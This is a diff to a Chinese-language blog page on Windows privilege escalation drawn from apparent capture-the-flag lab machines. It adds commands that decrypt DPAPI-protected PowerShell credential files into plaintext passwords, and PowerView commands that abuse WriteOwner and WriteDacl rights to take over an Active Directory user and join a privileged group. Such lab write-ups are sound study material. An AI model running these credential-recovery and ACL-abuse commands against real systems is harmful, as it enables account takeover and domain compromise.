@@ -44,7 +44,7 @@
   <meta itemprop="description" content="枚举 systeminfo c:\windows\system32\inetsrv&gt;systeminfo systeminfo Host Name: JSON OS Name: Microsoft Windows Server 2012 R2 Datacenter OS Version: 6.3.9600 N/A Build 9600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00252-80005-00001-AA602 Original Install Date: 5/22/2019, 4:27:16 PM System Boot Time: 3/1/2026, 8:27:41 PM System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 2 Processor(s) Installed. [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 11/12/2020 Windows Directory: C:\Windows System Directory: C:\Windows\system32 Boot Device: \Device\HarddiskVolume1 System Locale: en-us;English (United States) Input Locale: es-mx;Spanish (Mexico) Time Zone: (UTC-05:00) Eastern Time (US &amp; Canada) Total Physical Memory: 8,191 MB Available Physical Memory: 7,535 MB Virtual Memory: Max Size: 9,471 MB Virtual Memory: Available: 8,808 MB Virtual Memory: In Use: 663 MB Page File Location(s): C:\pagefile.sys Domain: WORKGROUP Logon Server: N/A Hotfix(s): N/A Network Card(s): 1 NIC(s) Installed. [01]: vmxnet3 Ethernet Adapter Connection Name: Ethernet0 2 DHCP Enabled: Yes DHCP Server: 10.10.10.2 IP address(es) [01]: 10.129.227.191 [02]: fe80::f19f:1378:66b2:439f [03]: dead:beef::f19f:1378:66b2:439f [04]: dead:beef::4f Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed. OS Name：系统版本 OS Version：内核版本 Hotfix(s)：补丁安装情况 Tasklist 查看 PID。">
   <meta itemprop="datePublished" content="2026-03-02T14:00:00+08:00">
   <meta itemprop="dateModified" content="2026-03-02T14:00:00+08:00">
-  <meta itemprop="wordCount" content="1454">
+  <meta itemprop="wordCount" content="1621">
   <meta itemprop="keywords" content="Hack">
 
   <meta name="twitter:card" content="summary">
@@ -122,7 +122,7 @@
           <circle cx="12" cy="12" r="10"></circle>
           <polyline points="12 6 12 12 16 14"></polyline>
         </svg>
-        7 minutes
+        8 minutes
 
         
       </p>
@@ -158,6 +158,8 @@
         <li><a href="#printspoofer">PrintSpoofer</a></li>
         <li><a href="#juciepotato">JuciePotato</a></li>
         <li><a href="#sebackupprivilege">SeBackupPrivilege</a></li>
+        <li><a href="#writeowner">WriteOwner</a></li>
+        <li><a href="#writedacl">WriteDacl</a></li>
       </ul>
     </li>
   </ul>
@@ -249,6 +251,16 @@
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gci C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\ </span>-Filter *.txt -File -Recurse
 </span></span></code></pre></div><h3 id="读取-xml">读取 xml。</h3>
 <p>在 <code>sfitz</code> 的 <code>Document</code> 中发现文件 <code>connection.xml</code>。</p>
+<p><code>cred.xml</code> 不是普通加密后无法恢复的文件，而是由当前用户上下文导出的 PowerShell 凭据对象，
+流程如下，假设用户为 <code>Enil</code>：</p>
+<ol>
+<li>Enil 使用 Export-Clixml 导出 PSCredential</li>
+<li>用户名明文保存：<code>Hernandez/Enil</code>，密码以 SecureString / DPAPI Blob 形式保存</li>
+<li>在 Enil 的会话、以 Enil 的用户执行 PowerShell</li>
+<li>Import-Clixml 调用 Windows DPAPI 解开用户可解密的数据</li>
+<li>GetNetworkCredential().Password 将 SecureString 转换明文</li>
+<li>得到 Enil 的密码</li>
+</ol>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>fitz<span style="color:#ae81ff">\D</span>ocuments&gt; cat connection.xml
 </span></span><span style="display:flex;"><span>cat connection.xml
 </span></span><span style="display:flex;"><span>&lt;Objs Version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.1.0.1&#34;</span> xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span>&gt;
@@ -273,7 +285,20 @@
 </span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>fitz<span style="color:#ae81ff">\D</span>ocuments&gt; $cred.GetNetworkCredential<span style="color:#f92672">()</span>.Password
 </span></span><span style="display:flex;"><span>$cred.GetNetworkCredential<span style="color:#f92672">()</span>.Password
 </span></span><span style="display:flex;"><span>f8gQ8fynP44ek1m3
+</span></span></code></pre></div><p>也可以像下面这样一句话解决。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;powershell -c <span style="color:#e6db74">&#34;</span>$cred<span style="color:#e6db74">=Import-Clixml C:\Users\nico\Desktop\cred.xml;</span>$cred<span style="color:#e6db74">.GetNetworkCredential().Password&#34;</span>
+</span></span><span style="display:flex;"><span>powershell -c <span style="color:#e6db74">&#34;</span>$cred<span style="color:#e6db74">=Import-Clixml C:\Users\nico\Desktop\cred.xml;</span>$cred<span style="color:#e6db74">.GetNetworkCredential().Password&#34;</span>
+</span></span><span style="display:flex;"><span>1ts-mag1c!!!
 </span></span></code></pre></div><p>方法二</p>
+<p>这个方法的核心流程如下：</p>
+<ol>
+<li>加密时：Enil 用户 + 本机 DPAPI 密钥</li>
+<li>得到密文 <code>0100...</code></li>
+<li>仍以 Enil 用户在同一台主机执行 ConvertTo-SecureString</li>
+<li>Windows DPAPI 能找到对应密钥并解密</li>
+<li>得到 SecureString</li>
+<li>GetNetworkCredential().Password 转换为明文</li>
+</ol>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>fitz<span style="color:#ae81ff">\D</span>ocuments&gt; $pass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6&#39;</span> | ConvertTo-SecureString
 </span></span><span style="display:flex;"><span>$pass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6&#39;</span> | ConvertTo-SecureString
 </span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>fitz<span style="color:#ae81ff">\D</span>ocuments&gt; $cred <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;alaading&#39;</span>,$pass<span style="color:#f92672">)</span>
@@ -599,6 +624,31 @@
 </span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
 </span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; type C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\r</span>oot.txt
 </span></span><span style="display:flex;"><span>4375a629c7c67c8e29db269060c955cb
+</span></span></code></pre></div><h3 id="writeowner">WriteOwner</h3>
+<p>WriteOwner 指有权修改某个对象的所有者（Owner）。</p>
+<ol>
+<li>拥有 WriteOwner</li>
+<li>把对象 Owner 改成自己或自己控制的账户</li>
+<li>Owner 天然可以修改对象的 DACL（访问控制列表）</li>
+<li>给自己授予更高权限</li>
+<li>利用新权限完成提权或横向移动</li>
+</ol>
+<p>举个例子，有下面这一条提权链条：</p>
+<p><code>tom（WriteOwner）</code> –&gt; <code>claire（WriteDacl）</code> –&gt; <code>Backup_Admins</code></p>
+<p>在这里 Tom 的 WriteOwner 权限不是直接给 Administrator 提权，而是让 Tom 能控制 <code>claire</code> 这个 AD 用户对象，作为后续提权链的第一环。</p>
+<p>Tom 可以把 Claire 对象的 Owner 改为 Tom。对应的逻辑如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>Set-DomainObjectOwner -Identity claire -OwnerIdentity Tom
+</span></span></code></pre></div><h3 id="writedacl">WriteDacl</h3>
+<p>WriteDacl 指可以修改某个对象的权限列表（DACL）。DACL 由一条条 ACE 组成，用来决定 ”谁能对该对象做什么“。拥有 WriteDacl 就能增删或修改这些 ACE。以下面这个提权链为例：</p>
+<p><code>tom（WriteOwner）</code> –&gt; <code>claire（WriteDacl）</code> –&gt; <code>Backup_Admins</code></p>
+<p>给出修改密码的命令如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Right ResetPassword
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>$pass = ConvertTo-SecureString <span style="color:#e6db74">&#39;123456&#39;</span> -AsPlainText -Force
+</span></span></code></pre></div><p>其中 <code>AsPlainText</code> 表示输入的是明文密码，而不是已经加密的 <code>SecureString</code> 数据。</p>
+<p>下面是添加权限的命令，修改 <code>Backup_Admins</code> 这个组对象的 ACL，给 <code>claire</code> 添加 <code>WriteMembers</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>Add-DomainObjectAcl -TargetIdentity <span style="color:#e6db74">&#39;Backup_Admins&#39;</span> -PrincipalIdentity claire -Rights WriteMembers
+</span></span></code></pre></div><p>将 <code>claire</code> 添加为 <code>Backup_Admins</code> 成员。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>Add-DomainGroupMember -Identity <span style="color:#e6db74">&#34;Backup_Admins&#34;</span> -Members claire
 </span></span></code></pre></div>
       </div>
     </article>
@@ -624,7 +674,7 @@
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        1454 Words
+        1621 Words
       </p>
 
       <p>
